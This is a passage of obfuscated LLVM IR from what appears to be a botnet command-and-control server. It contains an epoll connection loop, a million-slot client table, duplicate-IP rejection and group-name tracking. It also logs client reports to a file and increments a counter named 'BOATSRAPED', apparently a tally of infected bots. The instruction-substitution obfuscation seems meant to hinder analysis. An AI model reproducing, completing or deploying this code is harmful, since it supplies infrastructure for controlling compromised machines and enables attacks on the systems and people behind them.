  %32 = icmp slt i32 %30, %31
  br i1 %32, label %33, label %373

; <label>:33:                                     ; preds = %29
  %34 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %35 = load i32, i32* %8, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %34, i64 %36
  %38 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %37, i32 0, i32 0
  %39 = load i32, i32* %38, align 1
  %40 = xor i32 %39, -1
  %41 = xor i32 8, -1
  %42 = xor i32 -312911611, -1
  %43 = or i32 %40, %41
  %44 = or i32 -312911611, %42
  %45 = xor i32 %43, -1
  %46 = and i32 %45, %44
  %47 = and i32 %39, 8
  %48 = icmp ne i32 %46, 0
  br i1 %48, label %77, label %49

; <label>:49:                                     ; preds = %33
  %50 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i64 %52
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 1
  %56 = xor i32 16, -1
  %57 = xor i32 %55, %56
  %58 = and i32 %57, %55
  %59 = and i32 %55, 16
  %60 = icmp ne i32 %58, 0
  br i1 %60, label %77, label %61

; <label>:61:                                     ; preds = %49
  %62 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %63 = load i32, i32* %8, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i64 %64
  %66 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %65, i32 0, i32 0
  %67 = load i32, i32* %66, align 1
  %68 = xor i32 %67, -1
  %69 = xor i32 1, -1
  %70 = xor i32 1140835788, -1
  %71 = or i32 %68, %69
  %72 = or i32 1140835788, %70
  %73 = xor i32 %71, -1
  %74 = and i32 %73, %72
  %75 = and i32 %67, 1
  %76 = icmp ne i32 %74, 0
  br i1 %76, label %96, label %77

; <label>:77:                                     ; preds = %61, %49, %33
  %78 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %78, i64 %80
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %81, i32 0, i32 1
  %83 = bitcast %union.epoll_data* %82 to i32*
  %84 = load i32, i32* %83, align 1
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %85
  %87 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %86, i32 0, i32 3
  store i8 0, i8* %87, align 1
  %88 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %89 = load i32, i32* %8, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %88, i64 %90
  %92 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %91, i32 0, i32 1
  %93 = bitcast %union.epoll_data* %92 to i32*
  %94 = load i32, i32* %93, align 1
  %95 = call i32 @close(i32 %94)
  br label %367

; <label>:96:                                     ; preds = %61
  %97 = load volatile i32, i32* @listenFD, align 4
  %98 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %99 = load i32, i32* %8, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %98, i64 %100
  %102 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %101, i32 0, i32 1
  %103 = bitcast %union.epoll_data* %102 to i32*
  %104 = load i32, i32* %103, align 1
  %105 = icmp eq i32 %97, %104
  br i1 %105, label %106, label %262

; <label>:106:                                    ; preds = %96
  br label %107

; <label>:107:                                    ; preds = %256, %232, %229, %106
  store i32 16, i32* %10, align 4
  %108 = load volatile i32, i32* @listenFD, align 4
  %109 = call i32 @accept(i32 %108, %struct.sockaddr* %9, i32* %10)
  store i32 %109, i32* %11, align 4
  %110 = load i32, i32* %11, align 4
  %111 = icmp eq i32 %110, -1
  br i1 %111, label %112, label %122

; <label>:112:                                    ; preds = %107
  %113 = call i32* @__errno_location() #9
  %114 = load i32, i32* %113, align 4
  %115 = icmp eq i32 %114, 11
  br i1 %115, label %120, label %116

; <label>:116:                                    ; preds = %112
  %117 = call i32* @__errno_location() #9
  %118 = load i32, i32* %117, align 4
  %119 = icmp eq i32 %118, 11
  br i1 %119, label %120, label %121

; <label>:120:                                    ; preds = %116, %112
  br label %261

; <label>:121:                                    ; preds = %116
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0))
  br label %261

; <label>:122:                                    ; preds = %107
  %123 = bitcast %struct.sockaddr* %9 to %struct.sockaddr_in*
  %124 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %123, i32 0, i32 2
  %125 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %124, i32 0, i32 0
  %126 = load i32, i32* %125, align 2
  %127 = load i32, i32* %11, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %128
  %130 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %129, i32 0, i32 0
  store i32 %126, i32* %130, align 4
  %131 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %131, i8 0, i64 200, i32 16, i1 false)
  %132 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %133 = load i32, i32* %11, align 4
  %134 = call i32 @fdgets(i8* %132, i32 200, i32 %133)
  %135 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %136 = call i8* @strstr(i8* %135, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0)) #8
  %137 = icmp ne i8* %136, null
  br i1 %137, label %138, label %185

; <label>:138:                                    ; preds = %122
  %139 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  call void @trim(i8* %139)
  %140 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  call void @removestr(i8* %140, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0))
  %141 = load i32, i32* %11, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %142
  %144 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %143, i32 0, i32 2
  %145 = getelementptr inbounds [512 x i8], [512 x i8]* %144, i32 0, i32 0
  %146 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %147 = call i8* @strcpy(i8* %145, i8* %146) #7
  store i32 0, i32* %14, align 4
  br label %148

; <label>:148:                                    ; preds = %179, %138
  %149 = load i32, i32* %14, align 4
  %150 = icmp slt i32 %149, 40
  br i1 %150, label %151, label %184

; <label>:151:                                    ; preds = %148
  %152 = load i32, i32* %14, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %153
  %155 = getelementptr inbounds %struct.name, %struct.name* %154, i32 0, i32 0
  %156 = getelementptr inbounds [512 x i8], [512 x i8]* %155, i32 0, i32 0
  %157 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %158 = call i32 @strcmp(i8* %156, i8* %157) #8
  %159 = icmp ne i32 %158, 0
  br i1 %159, label %162, label %160

; <label>:160:                                    ; preds = %151
  %161 = call i32 @usleep(i32 40000)
  br label %184

; <label>:162:                                    ; preds = %151
  %163 = load i32, i32* %14, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %164
  %166 = getelementptr inbounds %struct.name, %struct.name* %165, i32 0, i32 0
  %167 = getelementptr inbounds [512 x i8], [512 x i8]* %166, i32 0, i32 0
  %168 = call i64 @strlen(i8* %167) #8
  %169 = icmp ule i64 %168, 0
  br i1 %169, label %170, label %178

; <label>:170:                                    ; preds = %162
  %171 = load i32, i32* %14, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %172
  %174 = getelementptr inbounds %struct.name, %struct.name* %173, i32 0, i32 0
  %175 = getelementptr inbounds [512 x i8], [512 x i8]* %174, i32 0, i32 0
  %176 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i32 0, i32 0
  %177 = call i8* @strcpy(i8* %175, i8* %176) #7
  br label %184

; <label>:178:                                    ; preds = %162
  br label %179

; <label>:179:                                    ; preds = %178
  %180 = load i32, i32* %14, align 4
  %181 = sub i32 0, 1
  %182 = sub i32 %180, %181
  %183 = add nsw i32 %180, 1
  store i32 %182, i32* %14, align 4
  br label %148

; <label>:184:                                    ; preds = %170, %160, %148
  br label %185

; <label>:185:                                    ; preds = %184, %122
  store i32 0, i32* %15, align 4
  store i32 0, i32* %12, align 4
  br label %186

; <label>:186:                                    ; preds = %215, %185
  %187 = load i32, i32* %12, align 4
  %188 = icmp slt i32 %187, 1000000
  br i1 %188, label %189, label %222

; <label>:189:                                    ; preds = %186
  %190 = load i32, i32* %12, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %191
  %193 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %192, i32 0, i32 3
  %194 = load i8, i8* %193, align 1
  %195 = icmp ne i8 %194, 0
  br i1 %195, label %196, label %200

; <label>:196:                                    ; preds = %189
  %197 = load i32, i32* %12, align 4
  %198 = load i32, i32* %11, align 4
  %199 = icmp eq i32 %197, %198
  br i1 %199, label %200, label %201

; <label>:200:                                    ; preds = %196, %189
  br label %215

; <label>:201:                                    ; preds = %196
  %202 = load i32, i32* %12, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %203
  %205 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 4
  %207 = load i32, i32* %11, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %208
  %210 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 4
  %212 = icmp eq i32 %206, %211
  br i1 %212, label %213, label %214

; <label>:213:                                    ; preds = %201
  store i32 1, i32* %15, align 4
  br label %222

; <label>:214:                                    ; preds = %201
  br label %215

; <label>:215:                                    ; preds = %214, %200
  %216 = load i32, i32* %12, align 4
  %217 = sub i32 0, %216
  %218 = sub i32 0, 1
  %219 = add i32 %217, %218
  %220 = sub i32 0, %219
  %221 = add nsw i32 %216, 1
  store i32 %220, i32* %12, align 4
  br label %186

; <label>:222:                                    ; preds = %213, %186
  %223 = load i32, i32* %15, align 4
  %224 = icmp ne i32 %223, 0
  br i1 %224, label %225, label %235

; <label>:225:                                    ; preds = %222
  %226 = load i32, i32* %11, align 4
  %227 = call i64 @send(i32 %226, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i32 0, i32 0), i64 8, i32 16384)
  %228 = icmp eq i64 %227, -1
  br i1 %228, label %229, label %232

; <label>:229:                                    ; preds = %225
  %230 = load i32, i32* %11, align 4
  %231 = call i32 @close(i32 %230)
  br label %107

; <label>:232:                                    ; preds = %225
  %233 = load i32, i32* %11, align 4
  %234 = call i32 @close(i32 %233)
  br label %107

; <label>:235:                                    ; preds = %222
  %236 = load i32, i32* %11, align 4
  %237 = call i32 @make_socket_non_blocking(i32 %236)
  store i32 %237, i32* %6, align 4
  %238 = load i32, i32* %6, align 4
  %239 = icmp eq i32 %238, -1
  br i1 %239, label %240, label %243

; <label>:240:                                    ; preds = %235
  %241 = load i32, i32* %11, align 4
  %242 = call i32 @close(i32 %241)
  br label %261

; <label>:243:                                    ; preds = %235
  %244 = load i32, i32* %11, align 4
  %245 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %246 = bitcast %union.epoll_data* %245 to i32*
  store i32 %244, i32* %246, align 1
  %247 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %247, align 1
  %248 = load volatile i32, i32* @epollFD, align 4
  %249 = load i32, i32* %11, align 4
  %250 = call i32 @epoll_ctl(i32 %248, i32 1, i32 %249, %struct.epoll_event* %4) #7
  store i32 %250, i32* %6, align 4
  %251 = load i32, i32* %6, align 4
  %252 = icmp eq i32 %251, -1
  br i1 %252, label %253, label %256

; <label>:253:                                    ; preds = %243
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  %254 = load i32, i32* %11, align 4
  %255 = call i32 @close(i32 %254)
  br label %261

; <label>:256:                                    ; preds = %243
  %257 = load i32, i32* %11, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %258
  %260 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %259, i32 0, i32 3
  store i8 1, i8* %260, align 1
  br label %107

; <label>:261:                                    ; preds = %253, %240, %121, %120
  br label %367

; <label>:262:                                    ; preds = %96
  %263 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %264 = load i32, i32* %8, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %263, i64 %265
  %267 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %266, i32 0, i32 1
  %268 = bitcast %union.epoll_data* %267 to i32*
  %269 = load i32, i32* %268, align 1
  store i32 %269, i32* %16, align 4
  %270 = load i32, i32* %16, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %271
  store %struct.clientdata_t* %272, %struct.clientdata_t** %17, align 8
  store i32 0, i32* %18, align 4
  %273 = load %struct.clientdata_t*, %struct.clientdata_t** %17, align 8
  %274 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %273, i32 0, i32 3
  store i8 1, i8* %274, align 1
  br label %275

; <label>:275:                                    ; preds = %355, %262
  %276 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %276, i8 0, i64 2048, i32 16, i1 false)
  br label %277

; <label>:277:                                    ; preds = %340, %336, %331, %313, %299, %275
  %278 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %278, i8 0, i64 2048, i32 16, i1 false)
  %279 = icmp ne i8* %278, null
  br i1 %279, label %280, label %286

; <label>:280:                                    ; preds = %277
  %281 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %282 = load i32, i32* %16, align 4
  %283 = call i32 @fdgets(i8* %281, i32 2048, i32 %282)
  %284 = sext i32 %283 to i64
  store i64 %284, i64* %19, align 8
  %285 = icmp sgt i64 %284, 0
  br label %286

; <label>:286:                                    ; preds = %280, %277
  %287 = phi i1 [ false, %277 ], [ %285, %280 ]
  br i1 %287, label %288, label %341

; <label>:288:                                    ; preds = %286
  %289 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %290 = call i8* @strstr(i8* %289, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0)) #8
  %291 = icmp eq i8* %290, null
  br i1 %291, label %292, label %293

; <label>:292:                                    ; preds = %288
  store i32 1, i32* %18, align 4
  br label %341

; <label>:293:                                    ; preds = %288
  %294 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  call void @trim(i8* %294)
  %295 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %296 = call i8* @strstr(i8* %295, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0)) #8
  %297 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %298 = icmp eq i8* %296, %297
  br i1 %298, label %299, label %308

; <label>:299:                                    ; preds = %293
  %300 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %301 = call i8* @strstr(i8* %300, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0)) #8
  %302 = getelementptr inbounds i8, i8* %301, i64 7
  store i8* %302, i8** %21, align 8
  %303 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %304 = load i8*, i8** %21, align 8
  %305 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %303, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i32 0, i32 0), i8* %304)
  %306 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %307 = call i32 @fflush(%struct._IO_FILE* %306)
  br label %277

; <label>:308:                                    ; preds = %293
  %309 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %310 = call i8* @strstr(i8* %309, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0)) #8
  %311 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %312 = icmp eq i8* %310, %311
  br i1 %312, label %313, label %322

; <label>:313:                                    ; preds = %308
  %314 = load volatile i32, i32* @BOATSRAPED, align 4
  %315 = add i32 %314, 897195704
  %316 = add i32 %315, 1
  %317 = sub i32 %316, 897195704
  %318 = add nsw i32 %314, 1
  store volatile i32 %317, i32* @BOATSRAPED, align 4
  %319 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %320 = call i8* @strstr(i8* %319, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0)) #8
  %321 = getelementptr inbounds i8, i8* %320, i64 11
  store i8* %321, i8** %22, align 8
  br label %277

; <label>:322:                                    ; preds = %308
  %323 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %324 = call i32 @strcmp(i8* %323, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %325 = icmp eq i32 %324, 0
  br i1 %325, label %326, label %332

; <label>:326:                                    ; preds = %322
  %327 = load i32, i32* %16, align 4
  %328 = call i64 @send(i32 %327, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0), i64 5, i32 16384)
  %329 = icmp eq i64 %328, -1
  br i1 %329, label %330, label %331

; <label>:330:                                    ; preds = %326
  store i32 1, i32* %18, align 4
  br label %341

; <label>:331:                                    ; preds = %326
  br label %277

; <label>:332:                                    ; preds = %322
  %333 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %334 = call i32 @strcmp(i8* %333, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i32 0, i32 0)) #8
  %335 = icmp eq i32 %334, 0
  br i1 %335, label %336, label %337

; <label>:336:                                    ; preds = %332
  br label %277

; <label>:337:                                    ; preds = %332
  %338 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i32 0, i32 0
  %339 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.14, i32 0, i32 0), i8* %338)
  br label %340

; <label>:340:                                    ; preds = %337
  br label %277

; <label>:341:                                    ; preds = %330, %292, %286
  %342 = load i64, i64* %19, align 8
  %343 = icmp eq i64 %342, -1
  br i1 %343, label %344, label %350

; <label>:344:                                    ; preds = %341
  %345 = call i32* @__errno_location() #9
  %346 = load i32, i32* %345, align 4
  %347 = icmp ne i32 %346, 11
  br i1 %347, label %348, label %349

; <label>:348:                                    ; preds = %344
  store i32 1, i32* %18, align 4
  br label %349

; <label>:349:                                    ; preds = %348, %344
  br label %356

; <label>:350:                                    ; preds = %341
  %351 = load i64, i64* %19, align 8
  %352 = icmp eq i64 %351, 0
  br i1 %352, label %353, label %354

; <label>:353:                                    ; preds = %350
  store i32 1, i32* %18, align 4
  br label %356

; <label>:354:                                    ; preds = %350
  br label %355

; <label>:355:                                    ; preds = %354
  br label %275

; <label>:356:                                    ; preds = %353, %349
  %357 = load i32, i32* %18, align 4
  %358 = icmp ne i32 %357, 0
  br i1 %358, label %359, label %364

; <label>:359:                                    ; preds = %356
  %360 = load %struct.clientdata_t*, %struct.clientdata_t** %17, align 8
  %361 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %360, i32 0, i32 3
  store i8 0, i8* %361, align 1
  %362 = load i32, i32* %16, align 4
  %363 = call i32 @close(i32 %362)
  br label %364

; <label>:364:                                    ; preds = %359, %356
  br label %365

; <label>:365:                                    ; preds = %364
  br label %366

; <label>:366:                                    ; preds = %365
  br label %367

; <label>:367:                                    ; preds = %366, %261, %77
  %368 = load i32, i32* %8, align 4
  %369 = sub i32 %368, 1200744547
  %370 = add i32 %369, 1
  %371 = add i32 %370, 1200744547
  %372 = add nsw i32 %368, 1
  store i32 %371, i32* %8, align 4
  br label %29

; <label>:373:                                    ; preds = %29
  br label %25
                                                  ; No predecessors!
  %375 = load i8*, i8** %2, align 8
  ret i8* %375
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #4

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #3

declare void @perror(i8*) #1

declare i32 @usleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @make_socket_non_blocking(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

; <label>:10:                                     ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %24

; <label>:11:                                     ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = and i32 %12, 2048
  %14 = xor i32 %12, 2048
  %15 = or i32 %13, %14
  %16 = or i32 %12, 2048
  store i32 %15, i32* %4, align 4
  %17 = load i32, i32* %3, align 4
  %18 = load i32, i32* %4, align 4
  %19 = call i32 (i32, i32, ...) @fcntl(i32 %17, i32 4, i32 %18)
  store i32 %19, i32* %5, align 4
  %20 = load i32, i32* %5, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %24

; <label>:23:                                     ; preds = %11
  store i32 0, i32* %2, align 4
  br label %24

; <label>:24:                                     ; preds = %23, %22, %10
  %25 = load i32, i32* %2, align 4
  ret i32 %25
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #4

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @printf(i8*, ...) #1

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

; <label>:3:                                      ; preds = %21, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %27

; <label>:6:                                      ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 3
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

; <label>:13:                                     ; preds = %6
  br label %21

; <label>:14:                                     ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = sub i32 0, %15
  %17 = sub i32 0, 1
  %18 = add i32 %16, %17
  %19 = sub i32 0, %18
  %20 = add nsw i32 %15, 1
  store i32 %19, i32* %2, align 4
  br label %21

; <label>:21:                                     ; preds = %14, %13
  %22 = load i32, i32* %1, align 4
  %23 = sub i32 %22, 2137288440
  %24 = add i32 %23, 1
  %25 = add i32 %24, 2137288440
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %1, align 4
  br label %3

; <label>:27:                                     ; preds = %3
  %28 = load i32, i32* %2, align 4
  ret i32 %28
}

; Function Attrs: noinline nounwind uwtable
define i32 @joinn() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [1000000 x i8], align 16
  store i32 0, i32* %4, align 4
  br label %6

; <label>:6:                                      ; preds = %14, %0
  %7 = load i32, i32* %4, align 4
  %8 = icmp slt i32 %7, 40
  br i1 %8, label %9, label %20

; <label>:9:                                      ; preds = %6
  %10 = load i32, i32* %4, align 4
  %11 = sext i32 %10 to i64
  %12 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %11
  %13 = getelementptr inbounds %struct.name, %struct.name* %12, i32 0, i32 1
  store i32 0, i32* %13, align 4
  br label %14

; <label>:14:                                     ; preds = %9
  %15 = load i32, i32* %4, align 4
  %16 = sub i32 %15, 1017981493
  %17 = add i32 %16, 1
  %18 = add i32 %17, 1017981493
  %19 = add nsw i32 %15, 1
  store i32 %18, i32* %4, align 4
  br label %6

; <label>:20:                                     ; preds = %6
  store i32 0, i32* %2, align 4
  br label %21

; <label>:21:                                     ; preds = %68, %20
  %22 = load i32, i32* %2, align 4
  %23 = icmp slt i32 %22, 1000000
  br i1 %23, label %24, label %74

; <label>:24:                                     ; preds = %21
  store i32 0, i32* %3, align 4
  br label %25

; <label>:25:                                     ; preds = %61, %24
  %26 = load i32, i32* %3, align 4
  %27 = icmp slt i32 %26, 40
  br i1 %27, label %28, label %67

; <label>:28:                                     ; preds = %25
  %29 = load i32, i32* %2, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %30
  %32 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %31, i32 0, i32 2
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %32, i32 0, i32 0
  %34 = load i32, i32* %3, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %35
  %37 = getelementptr inbounds %struct.name, %struct.name* %36, i32 0, i32 0
  %38 = getelementptr inbounds [512 x i8], [512 x i8]* %37, i32 0, i32 0
  %39 = call i32 @strcmp(i8* %33, i8* %38) #8
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %60

; <label>:41:                                     ; preds = %28
  %42 = load i32, i32* %2, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %43
  %45 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %44, i32 0, i32 3
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 1
  br i1 %48, label %49, label %60

; <label>:49:                                     ; preds = %41
  %50 = load i32, i32* %3, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %51
  %53 = getelementptr inbounds %struct.name, %struct.name* %52, i32 0, i32 1
  %54 = load i32, i32* %53, align 4
  %55 = sub i32 0, %54
  %56 = sub i32 0, 1
  %57 = add i32 %55, %56
  %58 = sub i32 0, %57
  %59 = add nsw i32 %54, 1
  store i32 %58, i32* %53, align 4
  br label %60

; <label>:60:                                     ; preds = %49, %41, %28
  br label %61

; <label>:61:                                     ; preds = %60
  %62 = load i32, i32* %3, align 4
  %63 = add i32 %62, -2009943026
  %64 = add i32 %63, 1
  %65 = sub i32 %64, -2009943026
  %66 = add nsw i32 %62, 1
  store i32 %65, i32* %3, align 4
  br label %25

; <label>:67:                                     ; preds = %25
  br label %68

; <label>:68:                                     ; preds = %67
  %69 = load i32, i32* %2, align 4
  %70 = add i32 %69, 710180260
  %71 = add i32 %70, 1
  %72 = sub i32 %71, 710180260
  %73 = add nsw i32 %69, 1
  store i32 %72, i32* %2, align 4
  br label %21

; <label>:74:                                     ; preds = %21
  %75 = load i32, i32* %1, align 4
  ret i32 %75
}

; Function Attrs: noinline nounwind uwtable
